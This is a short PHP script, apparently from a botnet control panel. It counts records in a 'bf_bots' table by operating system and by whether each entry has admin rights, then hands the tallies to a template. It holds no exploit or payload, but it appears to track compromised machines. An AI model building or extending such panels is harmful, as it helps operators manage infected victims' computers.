<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

$list = array();

function procent($x, $y){	return number_format(($x / $y) * 100, 2);
}

function reasult_data($row){
	global $list;
	if(empty($list[strtoupper($row->os)][0])) $list[strtoupper($row->os)][0] = 0;
	if(empty($list[strtoupper($row->os)][1])) $list[strtoupper($row->os)][1] = 0;
	$list[strtoupper($row->os)][$row->admin] = $row->count;
	if($row->admin == 1) $list[strtoupper($row->os)]['all'] = array_sum($list[strtoupper($row->os)]);
}

$mysqli->query('SELECT os, admin, count(id) count FROM bf_bots where (admin = \'0\') GROUP by os', null, 'reasult_data', false);
$mysqli->query('SELECT os, admin, count(id) count FROM bf_bots where (admin = \'1\') GROUP by os', null, 'reasult_data', false);

$smarty->assign('list', $list);
?>